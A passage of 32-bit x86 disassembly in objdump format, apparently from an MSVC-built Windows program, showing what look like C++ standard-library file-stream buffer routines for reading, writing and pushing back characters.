  403c07:	85 c0                	test   %eax,%eax
  403c09:	74 42                	je     0x403c4d
  403c0b:	3b f9                	cmp    %ecx,%edi
  403c0d:	7f 10                	jg     0x403c1f
  403c0f:	7c 04                	jl     0x403c15
  403c11:	3b f0                	cmp    %eax,%esi
  403c13:	73 0a                	jae    0x403c1f
  403c15:	8b c6                	mov    %esi,%eax
  403c17:	89 74 24 10          	mov    %esi,0x10(%esp)
  403c1b:	89 7c 24 14          	mov    %edi,0x14(%esp)
  403c1f:	50                   	push   %eax
  403c20:	ff 75 08             	push   0x8(%ebp)
  403c23:	ff 74 24 24          	push   0x24(%esp)
  403c27:	e8 95 3d 00 00       	call   0x4079c1
  403c2c:	8b 44 24 24          	mov    0x24(%esp),%eax
  403c30:	83 c4 0c             	add    $0xc,%esp
  403c33:	8b 54 24 10          	mov    0x10(%esp),%edx
  403c37:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403c3a:	03 ca                	add    %edx,%ecx
  403c3c:	2b f2                	sub    %edx,%esi
  403c3e:	8b 00                	mov    (%eax),%eax
  403c40:	1b 7c 24 14          	sbb    0x14(%esp),%edi
  403c44:	29 10                	sub    %edx,(%eax)
  403c46:	8b 43 20             	mov    0x20(%ebx),%eax
  403c49:	01 10                	add    %edx,(%eax)
  403c4b:	eb 08                	jmp    0x403c55
  403c4d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403c50:	eb 0d                	jmp    0x403c5f
  403c52:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403c55:	85 ff                	test   %edi,%edi
  403c57:	7c 20                	jl     0x403c79
  403c59:	7f 04                	jg     0x403c5f
  403c5b:	85 f6                	test   %esi,%esi
  403c5d:	74 1a                	je     0x403c79
  403c5f:	8b 43 4c             	mov    0x4c(%ebx),%eax
  403c62:	85 c0                	test   %eax,%eax
  403c64:	74 13                	je     0x403c79
  403c66:	50                   	push   %eax
  403c67:	56                   	push   %esi
  403c68:	6a 01                	push   $0x1
  403c6a:	51                   	push   %ecx
  403c6b:	ff 15 f8 91 40 00    	call   *0x4091f8
  403c71:	83 c4 10             	add    $0x10,%esp
  403c74:	2b f0                	sub    %eax,%esi
  403c76:	83 df 00             	sbb    $0x0,%edi
  403c79:	8b 44 24 20          	mov    0x20(%esp),%eax
  403c7d:	8b 54 24 24          	mov    0x24(%esp),%edx
  403c81:	2b c6                	sub    %esi,%eax
  403c83:	1b d7                	sbb    %edi,%edx
  403c85:	5f                   	pop    %edi
  403c86:	5e                   	pop    %esi
  403c87:	5b                   	pop    %ebx
  403c88:	8b e5                	mov    %ebp,%esp
  403c8a:	5d                   	pop    %ebp
  403c8b:	c2 0c 00             	ret    $0xc
  403c8e:	cc                   	int3
  403c8f:	cc                   	int3
  403c90:	55                   	push   %ebp
  403c91:	8b ec                	mov    %esp,%ebp
  403c93:	83 ec 0c             	sub    $0xc,%esp
  403c96:	8b 45 10             	mov    0x10(%ebp),%eax
  403c99:	53                   	push   %ebx
  403c9a:	8b d9                	mov    %ecx,%ebx
  403c9c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403c9f:	56                   	push   %esi
  403ca0:	8b 75 08             	mov    0x8(%ebp),%esi
  403ca3:	89 75 fc             	mov    %esi,-0x4(%ebp)
  403ca6:	85 c0                	test   %eax,%eax
  403ca8:	7f 12                	jg     0x403cbc
  403caa:	7c 04                	jl     0x403cb0
  403cac:	85 c9                	test   %ecx,%ecx
  403cae:	75 0c                	jne    0x403cbc
  403cb0:	5e                   	pop    %esi
  403cb1:	33 c0                	xor    %eax,%eax
  403cb3:	33 d2                	xor    %edx,%edx
  403cb5:	5b                   	pop    %ebx
  403cb6:	8b e5                	mov    %ebp,%esp
  403cb8:	5d                   	pop    %ebp
  403cb9:	c2 0c 00             	ret    $0xc
  403cbc:	83 7b 38 00          	cmpl   $0x0,0x38(%ebx)
  403cc0:	74 13                	je     0x403cd5
  403cc2:	50                   	push   %eax
  403cc3:	51                   	push   %ecx
  403cc4:	56                   	push   %esi
  403cc5:	8b cb                	mov    %ebx,%ecx
  403cc7:	ff 15 70 90 40 00    	call   *0x409070
  403ccd:	5e                   	pop    %esi
  403cce:	5b                   	pop    %ebx
  403ccf:	8b e5                	mov    %ebp,%esp
  403cd1:	5d                   	pop    %ebp
  403cd2:	c2 0c 00             	ret    $0xc
  403cd5:	8b 43 1c             	mov    0x1c(%ebx),%eax
  403cd8:	57                   	push   %edi
  403cd9:	8b f9                	mov    %ecx,%edi
  403cdb:	8b 00                	mov    (%eax),%eax
  403cdd:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403ce0:	85 c0                	test   %eax,%eax
  403ce2:	74 39                	je     0x403d1d
  403ce4:	8b 43 2c             	mov    0x2c(%ebx),%eax
  403ce7:	8d 53 2c             	lea    0x2c(%ebx),%edx
  403cea:	89 55 f4             	mov    %edx,-0xc(%ebp)
  403ced:	8b 00                	mov    (%eax),%eax
  403cef:	85 c0                	test   %eax,%eax
  403cf1:	74 30                	je     0x403d23
  403cf3:	3b c1                	cmp    %ecx,%eax
  403cf5:	8b f1                	mov    %ecx,%esi
  403cf7:	0f 42 f0             	cmovb  %eax,%esi
  403cfa:	56                   	push   %esi
  403cfb:	ff 75 f8             	push   -0x8(%ebp)
  403cfe:	ff 75 fc             	push   -0x4(%ebp)
  403d01:	e8 bb 3c 00 00       	call   0x4079c1
  403d06:	8b 43 2c             	mov    0x2c(%ebx),%eax
  403d09:	2b fe                	sub    %esi,%edi
  403d0b:	01 75 fc             	add    %esi,-0x4(%ebp)
  403d0e:	83 c4 0c             	add    $0xc,%esp
  403d11:	29 30                	sub    %esi,(%eax)
  403d13:	8b 43 1c             	mov    0x1c(%ebx),%eax
  403d16:	01 30                	add    %esi,(%eax)
  403d18:	8b 75 fc             	mov    -0x4(%ebp),%esi
  403d1b:	eb 06                	jmp    0x403d23
  403d1d:	8d 43 2c             	lea    0x2c(%ebx),%eax
  403d20:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403d23:	83 7b 4c 00          	cmpl   $0x0,0x4c(%ebx)
  403d27:	74 6d                	je     0x403d96
  403d29:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  403d2c:	8d 43 3c             	lea    0x3c(%ebx),%eax
  403d2f:	39 01                	cmp    %eax,(%ecx)
  403d31:	75 19                	jne    0x403d4c
  403d33:	8b 43 0c             	mov    0xc(%ebx),%eax
  403d36:	8b 53 54             	mov    0x54(%ebx),%edx
  403d39:	8b 4b 50             	mov    0x50(%ebx),%ecx
  403d3c:	2b d1                	sub    %ecx,%edx
  403d3e:	89 08                	mov    %ecx,(%eax)
  403d40:	8b 43 1c             	mov    0x1c(%ebx),%eax
  403d43:	89 08                	mov    %ecx,(%eax)
  403d45:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403d48:	8b 00                	mov    (%eax),%eax
  403d4a:	89 10                	mov    %edx,(%eax)
  403d4c:	a1 e8 91 40 00       	mov    0x4091e8,%eax
  403d51:	81 ff ff 0f 00 00    	cmp    $0xfff,%edi
  403d57:	76 2b                	jbe    0x403d84
  403d59:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  403d60:	ff 73 4c             	push   0x4c(%ebx)
  403d63:	68 ff 0f 00 00       	push   $0xfff
  403d68:	6a 01                	push   $0x1
  403d6a:	56                   	push   %esi
  403d6b:	ff d0                	call   *%eax
  403d6d:	83 c4 10             	add    $0x10,%esp
  403d70:	03 f0                	add    %eax,%esi
  403d72:	2b f8                	sub    %eax,%edi
  403d74:	3d ff 0f 00 00       	cmp    $0xfff,%eax
  403d79:	75 1b                	jne    0x403d96
  403d7b:	3b f8                	cmp    %eax,%edi
  403d7d:	a1 e8 91 40 00       	mov    0x4091e8,%eax
  403d82:	77 dc                	ja     0x403d60
  403d84:	85 ff                	test   %edi,%edi
  403d86:	74 0e                	je     0x403d96
  403d88:	ff 73 4c             	push   0x4c(%ebx)
  403d8b:	57                   	push   %edi
  403d8c:	6a 01                	push   $0x1
  403d8e:	56                   	push   %esi
  403d8f:	ff d0                	call   *%eax
  403d91:	83 c4 10             	add    $0x10,%esp
  403d94:	2b f8                	sub    %eax,%edi
  403d96:	8b 45 0c             	mov    0xc(%ebp),%eax
  403d99:	8b 55 10             	mov    0x10(%ebp),%edx
  403d9c:	2b c7                	sub    %edi,%eax
  403d9e:	5f                   	pop    %edi
  403d9f:	5e                   	pop    %esi
  403da0:	83 da 00             	sbb    $0x0,%edx
  403da3:	5b                   	pop    %ebx
  403da4:	8b e5                	mov    %ebp,%esp
  403da6:	5d                   	pop    %ebp
  403da7:	c2 0c 00             	ret    $0xc
  403daa:	cc                   	int3
  403dab:	cc                   	int3
  403dac:	cc                   	int3
  403dad:	cc                   	int3
  403dae:	cc                   	int3
  403daf:	cc                   	int3
  403db0:	55                   	push   %ebp
  403db1:	8b ec                	mov    %esp,%ebp
  403db3:	6a ff                	push   $0xffffffff
  403db5:	68 cd 7d 40 00       	push   $0x407dcd
  403dba:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403dc0:	50                   	push   %eax
  403dc1:	83 ec 2c             	sub    $0x2c,%esp
  403dc4:	a1 04 c0 40 00       	mov    0x40c004,%eax
  403dc9:	33 c5                	xor    %ebp,%eax
  403dcb:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403dce:	53                   	push   %ebx
  403dcf:	56                   	push   %esi
  403dd0:	57                   	push   %edi
  403dd1:	50                   	push   %eax
  403dd2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403dd5:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403ddb:	8b f9                	mov    %ecx,%edi
  403ddd:	8b 47 1c             	mov    0x1c(%edi),%eax
  403de0:	8b 08                	mov    (%eax),%ecx
  403de2:	85 c9                	test   %ecx,%ecx
  403de4:	74 23                	je     0x403e09
  403de6:	8b 57 2c             	mov    0x2c(%edi),%edx
  403de9:	8b 1a                	mov    (%edx),%ebx
  403deb:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  403dee:	3b c8                	cmp    %eax,%ecx
  403df0:	73 17                	jae    0x403e09
  403df2:	8d 43 ff             	lea    -0x1(%ebx),%eax
  403df5:	89 02                	mov    %eax,(%edx)
  403df7:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  403dfa:	8b 11                	mov    (%ecx),%edx
  403dfc:	8d 42 01             	lea    0x1(%edx),%eax
  403dff:	89 01                	mov    %eax,(%ecx)
  403e01:	0f b6 02             	movzbl (%edx),%eax
  403e04:	e9 e7 01 00 00       	jmp    0x403ff0
  403e09:	83 7f 4c 00          	cmpl   $0x0,0x4c(%edi)
  403e0d:	75 08                	jne    0x403e17
  403e0f:	83 c8 ff             	or     $0xffffffff,%eax
  403e12:	e9 d9 01 00 00       	jmp    0x403ff0
  403e17:	8b 5f 0c             	mov    0xc(%edi),%ebx
  403e1a:	8d 47 3c             	lea    0x3c(%edi),%eax
  403e1d:	39 03                	cmp    %eax,(%ebx)
  403e1f:	75 14                	jne    0x403e35
  403e21:	8b 57 54             	mov    0x54(%edi),%edx
  403e24:	8b 4f 50             	mov    0x50(%edi),%ecx
  403e27:	2b d1                	sub    %ecx,%edx
  403e29:	89 0b                	mov    %ecx,(%ebx)
  403e2b:	8b 47 1c             	mov    0x1c(%edi),%eax
  403e2e:	89 08                	mov    %ecx,(%eax)
  403e30:	8b 47 2c             	mov    0x2c(%edi),%eax
  403e33:	89 10                	mov    %edx,(%eax)
  403e35:	83 7f 38 00          	cmpl   $0x0,0x38(%edi)
  403e39:	8b 47 4c             	mov    0x4c(%edi),%eax
  403e3c:	75 17                	jne    0x403e55
  403e3e:	50                   	push   %eax
  403e3f:	ff 15 fc 91 40 00    	call   *0x4091fc
  403e45:	83 c4 04             	add    $0x4,%esp
  403e48:	83 f8 ff             	cmp    $0xffffffff,%eax
  403e4b:	74 c2                	je     0x403e0f
  403e4d:	0f b6 c0             	movzbl %al,%eax
  403e50:	e9 9b 01 00 00       	jmp    0x403ff0
  403e55:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  403e5c:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  403e63:	c7 45 e8 0f 00 00 00 	movl   $0xf,-0x18(%ebp)
  403e6a:	c6 45 d4 00          	movb   $0x0,-0x2c(%ebp)
  403e6e:	50                   	push   %eax
  403e6f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  403e76:	ff 15 fc 91 40 00    	call   *0x4091fc
  403e7c:	8b d0                	mov    %eax,%edx
  403e7e:	83 c4 04             	add    $0x4,%esp
  403e81:	83 fa ff             	cmp    $0xffffffff,%edx
  403e84:	0f 84 d2 00 00 00    	je     0x403f5c
  403e8a:	8b 5d c8             	mov    -0x38(%ebp),%ebx
  403e8d:	0f 1f 00             	nopl   (%eax)
  403e90:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  403e93:	8b 75 e8             	mov    -0x18(%ebp),%esi
  403e96:	88 55 d0             	mov    %dl,-0x30(%ebp)
  403e99:	3b ce                	cmp    %esi,%ecx
  403e9b:	73 1a                	jae    0x403eb7
  403e9d:	8d 41 01             	lea    0x1(%ecx),%eax
  403ea0:	83 fe 10             	cmp    $0x10,%esi
  403ea3:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403ea6:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  403ea9:	0f 43 45 d4          	cmovae -0x2c(%ebp),%eax
  403ead:	88 14 08             	mov    %dl,(%eax,%ecx,1)
  403eb0:	c6 44 08 01 00       	movb   $0x0,0x1(%eax,%ecx,1)
  403eb5:	eb 0d                	jmp    0x403ec4
  403eb7:	ff 75 d0             	push   -0x30(%ebp)
  403eba:	53                   	push   %ebx
  403ebb:	51                   	push   %ecx
  403ebc:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403ebf:	e8 ec 18 00 00       	call   0x4057b0
  403ec4:	83 7d e8 10          	cmpl   $0x10,-0x18(%ebp)
  403ec8:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403ecb:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403ece:	72 07                	jb     0x403ed7
  403ed0:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  403ed3:	03 c1                	add    %ecx,%eax
  403ed5:	eb 05                	jmp    0x403edc
  403ed7:	03 c1                	add    %ecx,%eax
  403ed9:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403edc:	8d 55 c8             	lea    -0x38(%ebp),%edx
  403edf:	52                   	push   %edx
  403ee0:	8d 55 f0             	lea    -0x10(%ebp),%edx
  403ee3:	52                   	push   %edx
  403ee4:	8d 55 ef             	lea    -0x11(%ebp),%edx
  403ee7:	52                   	push   %edx
  403ee8:	8d 55 cc             	lea    -0x34(%ebp),%edx
  403eeb:	52                   	push   %edx
  403eec:	50                   	push   %eax
  403eed:	51                   	push   %ecx
  403eee:	8b 4f 38             	mov    0x38(%edi),%ecx
  403ef1:	8d 47 40             	lea    0x40(%edi),%eax
  403ef4:	50                   	push   %eax
  403ef5:	ff 15 a8 90 40 00    	call   *0x4090a8
  403efb:	83 e8 00             	sub    $0x0,%eax
  403efe:	74 09                	je     0x403f09
  403f00:	83 e8 01             	sub    $0x1,%eax
  403f03:	0f 85 86 00 00 00    	jne    0x403f8f
  403f09:	8d 45 ef             	lea    -0x11(%ebp),%eax
  403f0c:	39 45 c8             	cmp    %eax,-0x38(%ebp)
  403f0f:	0f 85 8f 00 00 00    	jne    0x403fa4
  403f15:	83 7d e8 10          	cmpl   $0x10,-0x18(%ebp)
  403f19:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403f1c:	8b 45 cc             	mov    -0x34(%ebp),%eax
  403f1f:	72 07                	jb     0x403f28
  403f21:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  403f24:	2b c2                	sub    %edx,%eax
  403f26:	eb 05                	jmp    0x403f2d
  403f28:	2b c1                	sub    %ecx,%eax
  403f2a:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  403f2d:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  403f30:	3b c8                	cmp    %eax,%ecx
  403f32:	0f 42 c1             	cmovb  %ecx,%eax
  403f35:	2b c8                	sub    %eax,%ecx
  403f37:	03 c2                	add    %edx,%eax
  403f39:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  403f3c:	41                   	inc    %ecx
  403f3d:	51                   	push   %ecx
  403f3e:	50                   	push   %eax
  403f3f:	52                   	push   %edx
  403f40:	e8 82 3a 00 00       	call   0x4079c7
  403f45:	ff 77 4c             	push   0x4c(%edi)
  403f48:	ff 15 fc 91 40 00    	call   *0x4091fc
  403f4e:	8b d0                	mov    %eax,%edx
  403f50:	83 c4 10             	add    $0x10,%esp
  403f53:	83 fa ff             	cmp    $0xffffffff,%edx
  403f56:	0f 85 34 ff ff ff    	jne    0x403e90
  403f5c:	83 ce ff             	or     $0xffffffff,%esi
  403f5f:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403f62:	83 f9 10             	cmp    $0x10,%ecx
  403f65:	0f 82 83 00 00 00    	jb     0x403fee
  403f6b:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  403f6e:	41                   	inc    %ecx
  403f6f:	8b c2                	mov    %edx,%eax
  403f71:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  403f77:	72 6b                	jb     0x403fe4
  403f79:	8b 50 fc             	mov    -0x4(%eax),%edx
  403f7c:	83 c1 23             	add    $0x23,%ecx
  403f7f:	2b c2                	sub    %edx,%eax
  403f81:	83 c0 fc             	add    $0xfffffffc,%eax
  403f84:	83 f8 1f             	cmp    $0x1f,%eax
  403f87:	76 5b                	jbe    0x403fe4
  403f89:	ff 15 80 91 40 00    	call   *0x409180
  403f8f:	83 e8 02             	sub    $0x2,%eax
  403f92:	75 c8                	jne    0x403f5c
  403f94:	83 7d e8 10          	cmpl   $0x10,-0x18(%ebp)
  403f98:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  403f9b:	0f 43 45 d4          	cmovae -0x2c(%ebp),%eax
  403f9f:	0f be 30             	movsbl (%eax),%esi
  403fa2:	eb bb                	jmp    0x403f5f
  403fa4:	83 7d e8 10          	cmpl   $0x10,-0x18(%ebp)
  403fa8:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  403fab:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  403fae:	0f 43 45 d4          	cmovae -0x2c(%ebp),%eax
  403fb2:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  403fb5:	2b f1                	sub    %ecx,%esi
  403fb7:	03 f0                	add    %eax,%esi
  403fb9:	85 f6                	test   %esi,%esi
  403fbb:	7e 1e                	jle    0x403fdb
  403fbd:	8b 1d f0 91 40 00    	mov    0x4091f0,%ebx
  403fc3:	ff 77 4c             	push   0x4c(%edi)
  403fc6:	0f be 44 0e ff       	movsbl -0x1(%esi,%ecx,1),%eax
  403fcb:	4e                   	dec    %esi
  403fcc:	50                   	push   %eax
  403fcd:	ff d3                	call   *%ebx
  403fcf:	83 c4 08             	add    $0x8,%esp
  403fd2:	85 f6                	test   %esi,%esi
  403fd4:	7e 05                	jle    0x403fdb
  403fd6:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  403fd9:	eb e8                	jmp    0x403fc3
  403fdb:	0f b6 75 ef          	movzbl -0x11(%ebp),%esi
  403fdf:	e9 7b ff ff ff       	jmp    0x403f5f
  403fe4:	51                   	push   %ecx
  403fe5:	52                   	push   %edx
  403fe6:	e8 d1 2a 00 00       	call   0x406abc
  403feb:	83 c4 08             	add    $0x8,%esp
  403fee:	8b c6                	mov    %esi,%eax
  403ff0:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403ff3:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403ffa:	59                   	pop    %ecx
  403ffb:	5f                   	pop    %edi
  403ffc:	5e                   	pop    %esi
  403ffd:	5b                   	pop    %ebx
  403ffe:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404001:	33 cd                	xor    %ebp,%ecx
  404003:	e8 71 2a 00 00       	call   0x406a79
  404008:	8b e5                	mov    %ebp,%esp
  40400a:	5d                   	pop    %ebp
  40400b:	c3                   	ret
  40400c:	cc                   	int3
  40400d:	cc                   	int3
  40400e:	cc                   	int3
  40400f:	cc                   	int3
  404010:	56                   	push   %esi
  404011:	8b f1                	mov    %ecx,%esi
  404013:	8b 46 1c             	mov    0x1c(%esi),%eax
  404016:	8b 08                	mov    (%eax),%ecx
  404018:	85 c9                	test   %ecx,%ecx
  40401a:	74 10                	je     0x40402c
  40401c:	8b 46 2c             	mov    0x2c(%esi),%eax
  40401f:	8b 00                	mov    (%eax),%eax
  404021:	03 c1                	add    %ecx,%eax
  404023:	3b c8                	cmp    %eax,%ecx
  404025:	73 05                	jae    0x40402c
  404027:	0f b6 01             	movzbl (%ecx),%eax
  40402a:	5e                   	pop    %esi
  40402b:	c3                   	ret
  40402c:	8b 06                	mov    (%esi),%eax
  40402e:	8b ce                	mov    %esi,%ecx
  404030:	57                   	push   %edi
  404031:	ff 50 1c             	call   *0x1c(%eax)
  404034:	8b f8                	mov    %eax,%edi
  404036:	83 ff ff             	cmp    $0xffffffff,%edi
  404039:	75 05                	jne    0x404040
  40403b:	5f                   	pop    %edi
  40403c:	0b c0                	or     %eax,%eax
  40403e:	5e                   	pop    %esi
  40403f:	c3                   	ret
  404040:	8b 06                	mov    (%esi),%eax
  404042:	8b ce                	mov    %esi,%ecx
  404044:	57                   	push   %edi
  404045:	ff 50 10             	call   *0x10(%eax)
  404048:	8b c7                	mov    %edi,%eax
  40404a:	5f                   	pop    %edi
  40404b:	5e                   	pop    %esi
  40404c:	c3                   	ret
  40404d:	cc                   	int3
  40404e:	cc                   	int3
  40404f:	cc                   	int3
  404050:	55                   	push   %ebp
  404051:	8b ec                	mov    %esp,%ebp
  404053:	53                   	push   %ebx
  404054:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404057:	56                   	push   %esi
  404058:	8b f1                	mov    %ecx,%esi
  40405a:	8b 46 1c             	mov    0x1c(%esi),%eax
  40405d:	8b 08                	mov    (%eax),%ecx
  40405f:	85 c9                	test   %ecx,%ecx
  404061:	74 2e                	je     0x404091
  404063:	8b 46 0c             	mov    0xc(%esi),%eax
  404066:	39 08                	cmp    %ecx,(%eax)
  404068:	73 27                	jae    0x404091
  40406a:	83 fb ff             	cmp    $0xffffffff,%ebx
  40406d:	74 08                	je     0x404077
  40406f:	0f b6 41 ff          	movzbl -0x1(%ecx),%eax
  404073:	3b c3                	cmp    %ebx,%eax
  404075:	75 1a                	jne    0x404091
  404077:	8b 46 2c             	mov    0x2c(%esi),%eax
  40407a:	ff 00                	incl   (%eax)
  40407c:	8b 46 1c             	mov    0x1c(%esi),%eax
  40407f:	ff 08                	decl   (%eax)
  404081:	33 c0                	xor    %eax,%eax
  404083:	83 fb ff             	cmp    $0xffffffff,%ebx
  404086:	0f 44 d8             	cmove  %eax,%ebx
  404089:	5e                   	pop    %esi
  40408a:	8b c3                	mov    %ebx,%eax
  40408c:	5b                   	pop    %ebx
  40408d:	5d                   	pop    %ebp
  40408e:	c2 04 00             	ret    $0x4
  404091:	8b 46 4c             	mov    0x4c(%esi),%eax
  404094:	85 c0                	test   %eax,%eax
  404096:	74 5a                	je     0x4040f2
  404098:	83 fb ff             	cmp    $0xffffffff,%ebx
  40409b:	74 55                	je     0x4040f2
  40409d:	83 7e 38 00          	cmpl   $0x0,0x38(%esi)
  4040a1:	75 13                	jne    0x4040b6
  4040a3:	50                   	push   %eax
  4040a4:	0f b6 cb             	movzbl %bl,%ecx
  4040a7:	51                   	push   %ecx
  4040a8:	ff 15 f0 91 40 00    	call   *0x4091f0
  4040ae:	83 c4 08             	add    $0x8,%esp
  4040b1:	83 f8 ff             	cmp    $0xffffffff,%eax
  4040b4:	75 d3                	jne    0x404089
  4040b6:	8b 56 1c             	mov    0x1c(%esi),%edx
  4040b9:	8d 4e 3c             	lea    0x3c(%esi),%ecx
  4040bc:	39 0a                	cmp    %ecx,(%edx)
  4040be:	74 32                	je     0x4040f2
  4040c0:	57                   	push   %edi
  4040c1:	8b 7e 0c             	mov    0xc(%esi),%edi
  4040c4:	88 19                	mov    %bl,(%ecx)
  4040c6:	8b 07                	mov    (%edi),%eax
  4040c8:	3b c1                	cmp    %ecx,%eax
  4040ca:	74 0d                	je     0x4040d9
  4040cc:	89 46 50             	mov    %eax,0x50(%esi)
  4040cf:	8b 46 2c             	mov    0x2c(%esi),%eax
  4040d2:	8b 00                	mov    (%eax),%eax
  4040d4:	03 02                	add    (%edx),%eax
  4040d6:	89 46 54             	mov    %eax,0x54(%esi)
  4040d9:	89 0f                	mov    %ecx,(%edi)
  4040db:	8b 46 1c             	mov    0x1c(%esi),%eax
  4040de:	5f                   	pop    %edi
  4040df:	89 08                	mov    %ecx,(%eax)
  4040e1:	8b 46 2c             	mov    0x2c(%esi),%eax
  4040e4:	5e                   	pop    %esi
  4040e5:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  4040eb:	8b c3                	mov    %ebx,%eax
  4040ed:	5b                   	pop    %ebx
  4040ee:	5d                   	pop    %ebp
  4040ef:	c2 04 00             	ret    $0x4
  4040f2:	5e                   	pop    %esi
  4040f3:	83 c8 ff             	or     $0xffffffff,%eax
  4040f6:	5b                   	pop    %ebx
  4040f7:	5d                   	pop    %ebp
  4040f8:	c2 04 00             	ret    $0x4
  4040fb:	cc                   	int3
  4040fc:	cc                   	int3
  4040fd:	cc                   	int3
  4040fe:	cc                   	int3
  4040ff:	cc                   	int3
  404100:	55                   	push   %ebp
  404101:	8b ec                	mov    %esp,%ebp
  404103:	83 ec 30             	sub    $0x30,%esp
  404106:	a1 04 c0 40 00       	mov    0x40c004,%eax
  40410b:	33 c5                	xor    %ebp,%eax
  40410d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404110:	53                   	push   %ebx
  404111:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404114:	56                   	push   %esi
  404115:	8b f1                	mov    %ecx,%esi
  404117:	83 fb ff             	cmp    $0xffffffff,%ebx
  40411a:	75 14                	jne    0x404130
  40411c:	5e                   	pop    %esi
  40411d:	33 c0                	xor    %eax,%eax
  40411f:	5b                   	pop    %ebx
  404120:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404123:	33 cd                	xor    %ebp,%ecx
  404125:	e8 4f 29 00 00       	call   0x406a79
  40412a:	8b e5                	mov    %ebp,%esp
  40412c:	5d                   	pop    %ebp
  40412d:	c2 04 00             	ret    $0x4
  404130:	8b 46 20             	mov    0x20(%esi),%eax
  404133:	8b 00                	mov    (%eax),%eax
  404135:	85 c0                	test   %eax,%eax
  404137:	74 27                	je     0x404160
  404139:	8b 56 30             	mov    0x30(%esi),%edx
  40413c:	8b 12                	mov    (%edx),%edx
  40413e:	03 d0                	add    %eax,%edx
  404140:	3b c2                	cmp    %edx,%eax
  404142:	73 1c                	jae    0x404160
  404144:	ff 15 9c 90 40 00    	call   *0x40909c
  40414a:	5e                   	pop    %esi
  40414b:	88 18                	mov    %bl,(%eax)
  40414d:	8b c3                	mov    %ebx,%eax
  40414f:	5b                   	pop    %ebx
  404150:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404153:	33 cd                	xor    %ebp,%ecx
  404155:	e8 1f 29 00 00       	call   0x406a79
  40415a:	8b e5                	mov    %ebp,%esp
  40415c:	5d                   	pop    %ebp
  40415d:	c2 04 00             	ret    $0x4
  404160:	83 7e 4c 00          	cmpl   $0x0,0x4c(%esi)
  404164:	57                   	push   %edi
  404165:	0f 84 cd 00 00 00    	je     0x404238
  40416b:	8b 7e 0c             	mov    0xc(%esi),%edi
  40416e:	8d 46 3c             	lea    0x3c(%esi),%eax
  404171:	39 07                	cmp    %eax,(%edi)
  404173:	75 14                	jne    0x404189
  404175:	8b 56 54             	mov    0x54(%esi),%edx
  404178:	8b 4e 50             	mov    0x50(%esi),%ecx
  40417b:	2b d1                	sub    %ecx,%edx
  40417d:	89 0f                	mov    %ecx,(%edi)
  40417f:	8b 46 1c             	mov    0x1c(%esi),%eax
  404182:	89 08                	mov    %ecx,(%eax)
  404184:	8b 46 2c             	mov    0x2c(%esi),%eax
  404187:	89 10                	mov    %edx,(%eax)
  404189:	8b 4e 38             	mov    0x38(%esi),%ecx
  40418c:	85 c9                	test   %ecx,%ecx
  40418e:	75 05                	jne    0x404195
  404190:	0f be c3             	movsbl %bl,%eax
  404193:	eb 38                	jmp    0x4041cd
  404195:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404198:	88 5d db             	mov    %bl,-0x25(%ebp)
  40419b:	50                   	push   %eax
  40419c:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40419f:	50                   	push   %eax
  4041a0:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4041a3:	50                   	push   %eax
  4041a4:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4041a7:	50                   	push   %eax
  4041a8:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4041ab:	50                   	push   %eax
  4041ac:	8d 45 db             	lea    -0x25(%ebp),%eax
  4041af:	50                   	push   %eax
  4041b0:	8d 46 40             	lea    0x40(%esi),%eax
  4041b3:	50                   	push   %eax
  4041b4:	ff 15 a4 90 40 00    	call   *0x4090a4
  4041ba:	83 e8 00             	sub    $0x0,%eax
  4041bd:	74 38                	je     0x4041f7
  4041bf:	83 e8 01             	sub    $0x1,%eax
  4041c2:	74 33                	je     0x4041f7
  4041c4:	83 e8 02             	sub    $0x2,%eax
  4041c7:	75 6f                	jne    0x404238
  4041c9:	0f be 45 db          	movsbl -0x25(%ebp),%eax
